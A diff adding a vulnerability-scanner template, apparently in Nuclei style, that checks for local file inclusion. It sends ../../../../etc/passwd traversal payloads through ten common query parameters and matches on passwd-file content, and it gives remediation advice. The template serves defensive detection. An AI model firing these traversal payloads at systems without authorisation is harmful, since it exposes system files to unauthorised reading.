@@ -1,0 +1,26 @@
+id: lfi-extended
+info:
+  name: Local File Inclusion via Common Query Parameters
+  severity: critical
+  tags: [lfi, injection, traversal]
+  description: "A traversal payload in a common file-loading query parameter (?file, ?page, ?include, etc.) returned the contents of /etc/passwd, confirming that user-supplied paths reach the filesystem without sanitization."
+  remediation: "Never pass user-supplied values directly to filesystem functions. Maintain an allowlist of permitted files or use indirect references (numeric IDs mapped server-side to file paths). Strip or reject path separator characters from user input."
+  cwe: "CWE-22"
+  owasp: "A01:2021-Broken Access Control"
+
+requests:
+  - method: GET
+    paths:
+      - "/?file=../../../../etc/passwd"
+      - "/?page=../../../../etc/passwd"
+      - "/?include=../../../../etc/passwd"
+      - "/?path=../../../../etc/passwd"
+      - "/?template=../../../../etc/passwd"
+      - "/?view=../../../../etc/passwd"
+      - "/?doc=../../../../etc/passwd"
+      - "/?load=../../../../etc/passwd"
+      - "/?filename=../../../../etc/passwd"
+      - "/?content=../../../../etc/passwd"
+    matchers:
+      - type: regex
+        regex: ["root:.*:0:0:"]
